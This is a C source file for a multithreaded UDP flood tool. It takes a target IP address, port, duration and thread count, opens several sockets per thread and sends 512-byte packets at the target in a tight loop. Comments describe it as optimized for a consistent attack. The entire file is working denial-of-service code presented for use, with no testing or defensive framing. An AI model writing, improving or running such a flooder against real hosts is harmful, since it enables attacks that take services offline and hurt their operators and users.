#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sys/resource.h>

// Optimized for Consistent Attack
#define MAX_PACKET_SIZE 512       // Optimal packet size for UDP flood
#define SOCKETS_PER_THREAD 4      // Balanced socket count
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 10) // 10MB buffer
#define THREAD_SLEEP_NS 100000    // 0.1ms between bursts (reduced for consistency)
#define MAX_RETRIES 3             // Socket creation retries

typedef struct {
    const char *target_ip;
    uint16_t target_port;
    volatile int *running;
} AttackParams;

static char packet[MAX_PACKET_SIZE];

// Optimize network priority
void optimize_network() {
    int prio = -10; // Elevated priority
    setpriority(PRIO_PROCESS, 0, prio);
}

// Precision timing for consistent pacing
void precise_sleep(long ns) {
    struct timespec ts = {0, ns};
    nanosleep(&ts, NULL);
}

// Create sockets with error handling
int create_socket(struct sockaddr_in *dest_addr) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    if (connect(sock, (struct sockaddr*)dest_addr, sizeof(*dest_addr)) == -1) {
        close(sock);
        return -1;
    }
    return sock;
}

// UDP flood thread with consistent pacing
void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[SOCKETS_PER_THREAD];

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Create sockets
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        socks[i] = create_socket(&dest_addr);
    }

    // Attack loop with consistent pacing
    while (*params->running) {
        for (int s = 0; s < SOCKETS_PER_THREAD; s++) {
            if (socks[s] == -1) {
                socks[s] = create_socket(&dest_addr); // Recover socket
                continue;
            }
            
            if (send(socks[s], packet, MAX_PACKET_SIZE, 0) == -1) {
                close(socks[s]);
                socks[s] = -1; // Mark as failed
            }
        }
        precise_sleep(THREAD_SLEEP_NS); // Consistent pacing
    }

    // Cleanup
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (socks[i] != -1) close(socks[i]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREAD_COUNT>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    uint16_t port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    if (thread_count <= 0) {
        fprintf(stderr, "Error: Thread count must be a positive integer.\n");
        return 1;
    }

    // Initialize payload with varying pattern
    for (int i = 0; i < MAX_PACKET_SIZE; i++) {
        packet[i] = (i % 256);
    }

    optimize_network();
    volatile int running = 1;
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    AttackParams *params = malloc(thread_count * sizeof(AttackParams));

    if (!threads || !params) {
        fprintf(stderr, "Error: Memory allocation failed.\n");
        return 1;
    }

    // Launch attack threads
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].running = &running;
        
        if (pthread_create(&threads[i], NULL, udp_flood, &params[i])) {
            fprintf(stderr, "Warning: Failed to create thread %d\n", i);
        }
    }

    // Run for the specified duration with a simple countdown timer
    for (int i = duration; i > 0; i--) {
        printf("Countdown: %d seconds\r", i);
        fflush(stdout); // Ensure the countdown is displayed immediately
        sleep(1);
    }

    running = 0;

    // Wait for threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Cleanup
    free(threads);
    free(params);

    printf("\nAttack completed!\n"); // New line after countdown finishes
    return 0;
}